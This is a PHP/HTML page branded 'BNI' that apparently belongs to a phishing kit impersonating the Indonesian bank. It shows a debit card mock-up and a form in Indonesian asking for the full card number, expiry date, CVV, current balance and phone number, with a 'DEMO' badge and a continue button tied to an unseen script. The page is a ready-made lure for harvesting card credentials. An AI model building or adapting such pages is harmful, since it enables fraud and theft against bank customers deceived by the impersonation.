<?php
?> <html>
  <head>
    <title>BNI</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/common/css/global.css">
    <link rel="stylesheet" href="assets/common/css/card.css">
    <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
    <script src="assets/common/js/jquery.js"></script>
    <script>
      const module = {};
    </script>
    <script type="module" src="assets/common/js/card.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </head>
  <body>
    <div style="width: 100%; height: 100%; display: flex; flex-direction: column; background-color: #dde1e6;">
      <div style="padding: 10px; background-color: #e55300;">
        <img src="assets/common/img/img1.png" width="100px" height="50px">
      </div>
      <div style="width: 100%; flex: 1; overflow: scroll;">
        <div style="padding-left: 30px; padding-right: 30px; display: flex; flex-direction: column; align-items: center;">
          <div class="flip-card">
            <div class="flip-card-inner">
              <div class="flip-card-front">
                <div style="width: 100%; height: 200px; border-radius: 30px; border: 4px solid #e55300; background-color: #ffffff; padding: 2px; margin-top: 20px; position: relative;">
                  <img src="assets/common/img/card.png" width="100%" height="100%" style="object-fit: fill; border-radius: 25px;">
                  <img src="assets/common/img/chip.png" width="55px" height="55px" style="object-fit: fill; position: absolute; left: 15px; top: 60px;">
                  <div style="color: #ebf041; font-size: 12px; position: absolute; left: 15px; top: 115px;">Nomor Kartu Debit</div>
                  <div style="color: #23bfbf; font-size: 20px; position: absolute; left: 15px; top: 125px; font-weight: bold; text-shadow: 2px 2px #ff0000; text-shadow: 2px 2px 8px rgba(0,0,0,0.8);">#### #### #### ####</div>
                  <div style="color: #ebf041; font-size: 12px; position: absolute; left: 15px; top: 155px;">Masa Berlaku</div>
                  <div style="color: #23bfbf; font-size: 20px; position: absolute; left: 15px; top: 165px; font-weight: bold; text-shadow: 2px 2px 8px rgba(0,0,0,0.8);">MM/YY</div>
                </div>
              </div>
              <div class="flip-card-back">
                <div style="width: 100%; height: 200px; border-radius: 30px; border: 4px solid #e55300; background-color: #ffffff; padding: 2px; margin-top: 20px; position: relative;">
                  <img src="assets/common/img/card-back.png" width="100%" height="100%" style="object-fit: fill; border-radius: 25px;">
                  <div id="preview-cvv" style="color: #23bfbf; font-size: 20px; font-weight: bold; position: absolute; right: 20px; top: 80px;"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div style="width: calc(100% - 88px); background-color: #ffffff; margin-left: 20px; margin-right: 20px; margin-top: 30px; margin-bottom: 20px; border: 4px solid #dddcdd; border-radius: 30px; padding: 20px; box-shadow: 0 4px 12px 0 rgba(0,0,0,0.2); display: flex; flex-direction: column; align-items: center;">
          <div class="card-detail" style="width: calc(100% - 8px); height: 50px; background-color: #dbdada; border-radius: 10px; border: 4px solid #c9cacc; display: flex; flex-direction: row; align-items: center;">
            <input id="debit-number" style="height: 100%; color: #000000; font-size: 17px; padding-left: 10px; padding-right: 10px; flex: 1;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="16" placeholder="Masukkan 16 digit nomor kartu">
            <img id="debit-number-img" src="assets/common/img/img3.png" width="50px" height="30px" style="object-fit: fill; display: none; margin-right: 5px;">
          </div>
          <div style="width: 100%; display: flex; flex-direction: row;">
            <div class="card-detail" style="flex: 1; height: 50px; background-color: #dbdada; border-radius: 10px; border: 4px solid #c9cacc; display: flex; flex-direction: row; align-items: center; margin-top: 10px; margin-right: 5px;">
              <select id="month" style="height: 100%; color: #000000; font-size: 17px; padding-left: 10px; padding-right: 10px; flex: 1;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="2" placeholder="Bulan">
                <option>01</option>
                <option>02</option>
                <option>03</option>
                <option>04</option>
                <option>05</option>
                <option>06</option>
                <option>07</option>
                <option>08</option>
                <option>09</option>
                <option>10</option>
                <option>11</option>
                <option>12</option>
              </select>
              <ion-icon name="chevron-down" style="color: #1f3a55; font-size: 20px; margin-right: 5px;"></ion-icon>
            </div>
            <div class="card-detail" style="flex: 1; height: 50px; background-color: #dbdada; border-radius: 10px; border: 4px solid #c9cacc; display: flex; flex-direction: row; align-items: center; margin-top: 10px; margin-left: 5px;">
              <select id="year" style="height: 100%; color: #000000; font-size: 17px; padding-left: 10px; padding-right: 10px; flex: 1;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="4" placeholder="Tahun"></select>
              <ion-icon name="chevron-down" style="color: #1f3a55; font-size: 20px; margin-right: 5px;"></ion-icon>
            </div>
          </div>
          <div class="card-detail" style="width: calc(100% - 8px); height: 50px; background-color: #dbdada; border-radius: 10px; border: 4px solid #c9cacc; display: flex; flex-direction: row; align-items: center; margin-top: 10px;">
            <input id="cvv" style="height: 100%; color: #000000; font-size: 17px; padding-left: 10px; padding-right: 10px; flex: 1;" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="3" placeholder="CVV (3 Digit di belakang kartu)">
          </div>
          <div class="card-detail" style="width: calc(100% - 8px); height: 50px; background-color: #dbdada; border-radius: 10px; border: 4px solid #c9cacc; display: flex; flex-direction: row; align-items: center; margin-top: 10px;">
            <div style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center; color: #000000; font-size: 20px; background-color: #e6e6e6; border-top-left-radius: 5px; border-bottom-left-radius: 5px;"> Rp </div>
            <input id="balance" type="number" style="height: 100%; color: #000000; font-size: 17px; padding-left: 10px; padding-right: 10px; flex: 1;" placeholder="Saldo terakhir Anda">
          </div>
          <div class="card-detail" style="width: calc(100% - 8px); height: 50px; background-color: #dbdada; border-radius: 10px; border: 4px solid #c9cacc; display: flex; flex-direction: row; align-items: center; margin-top: 10px;">
            <div style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center; color: #000000; font-size: 20px; background-color: #e6e6e6; border-top-left-radius: 5px; border-bottom-left-radius: 5px;">
              <ion-icon name="phone-portrait" style="color: #1f3a55; font-size: 25px;"></ion-icon>
            </div>
            <input id="phone" type="number" style="height: 100%; color: #000000; font-size: 17px; padding-left: 10px; padding-right: 10px; flex: 1;" placeholder="Nomor telepon Anda">
          </div>
          <div class="ripple" style="width: 100%; height: 50px; background-color: #e55300; color: #ffffff; margin-left: 0px; margin-right: 0px; margin-bottom: 20px; margin-top: 20px; border-radius: 20px; font-size: 20px; font-weight: bold; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.4);" onclick="module.next()"> Lanjutkan </div>
          <img src="assets/common/img/img4.png" width="100px" height="30px" style="margin-bottom: 0px; align-self: center;">
        </div>
      </div>
      <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; color: #ffffff; font-size: 20px; font-weight: bold; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px;">DEMO</div>
    </div>
  </body>
</html>